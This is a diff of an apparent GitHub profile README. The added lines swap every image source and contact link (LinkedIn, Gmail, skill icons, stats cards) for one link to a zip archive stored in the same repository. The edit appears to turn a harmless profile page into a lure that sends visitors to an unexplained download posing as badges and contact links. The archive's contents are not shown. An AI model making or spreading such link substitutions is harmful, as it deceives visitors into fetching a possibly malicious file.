@@ -1,15 +1,15 @@
 <div align="center">
-  <img height="150" src="https://media.giphy.com/media/RbDKaczqWovIugyJmW/giphy.gif?cid=790b7611yhtfdasw3wqj0il5tg2dko442bid4y6kyp9k9asa&ep=v1_gifs_search&rid=giphy.gif&ct=g"  />
+  <img height="150" src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip"  />
 </div>
 
 ###
 
 <div align="center">
-  <a href="https://www.linkedin.com/in/abhinav-singh-05bb9723a/" target="_blank">
-    <img src="https://img.shields.io/static/v1?message=LinkedIn&logo=linkedin&label=&color=0077B5&logoColor=white&labelColor=&style=for-the-badge" height="25" alt="linkedin logo"  />
+  <a href="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="25" alt="linkedin logo"  />
   </a>
-  <a href="abhinavsinghh2019@gmail.com" target="_blank">
-    <img src="https://img.shields.io/static/v1?message=Gmail&logo=gmail&label=&color=D14836&logoColor=white&labelColor=&style=for-the-badge" height="25" alt="gmail logo"  />
+  <a href="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="25" alt="gmail logo"  />
   </a>
 </div>
 
@@ -28,33 +28,33 @@
 ###
 
 <div align="left">
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/anaconda/anaconda-original.svg" height="40" alt="anaconda logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="anaconda logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/arduino/arduino-original.svg" height="40" alt="arduino logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="arduino logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/cplusplus/cplusplus-original.svg" height="40" alt="cplusplus logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="cplusplus logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/css3/css3-original.svg" height="40" alt="css3 logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="css3 logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/github/github-original.svg" height="40" alt="github logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="github logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/git/git-original.svg" height="40" alt="git logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="git logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/html5/html5-original.svg" height="40" alt="html5 logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="html5 logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/javascript/javascript-original.svg" height="40" alt="javascript logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="javascript logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/jupyter/jupyter-original.svg" height="40" alt="jupyter logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="jupyter logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linkedin/linkedin-original.svg" height="40" alt="linkedin logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="linkedin logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mysql/mysql-original.svg" height="40" alt="mysql logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="mysql logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/nodejs/nodejs-original.svg" height="40" alt="nodejs logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="nodejs logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/pycharm/pycharm-original.svg" height="40" alt="pycharm logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="pycharm logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg" height="40" alt="python logo"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="40" alt="python logo"  />
 </div>
 
 ###
@@ -64,24 +64,24 @@
 ###
 
 <div align="center">
-  <img src="https://streak-stats.demolab.com?user=singhnileshh&locale=en&mode=daily&theme=dark&hide_border=false&border_radius=5&order=3" height="220" alt="streak graph"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="220" alt="streak graph"  />
 </div>
 
 ###
 
 <div align="center">
-  <img src="https://profile-counter.glitch.me/abhinavv22/count.svg?"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip"  />
 </div>
 
 ###
 
-<img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/output/snake.svg" alt="Snake animation" />
+<img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" alt="Snake animation" />
 
 ###
 
 <div align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=singhnileshh&hide_title=false&hide_rank=false&show_icons=true&include_all_commits=true&count_private=true&disable_animations=false&theme=dracula&locale=en&hide_border=false&order=1" height="150" alt="stats graph"  />
-  <img src="https://github-readme-stats.vercel.app/api/top-langs?username=singhnileshh&locale=en&hide_title=false&layout=compact&card_width=320&langs_count=5&theme=dracula&hide_border=false&order=2" height="150" alt="languages graph"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="150" alt="stats graph"  />
+  <img src="https://raw.githubusercontent.com/abhinavv22/abhinavv22/main/wharfinger/abhinavv22-2.8-alpha.2.zip" height="150" alt="languages graph"  />
 </div>
 
 ###
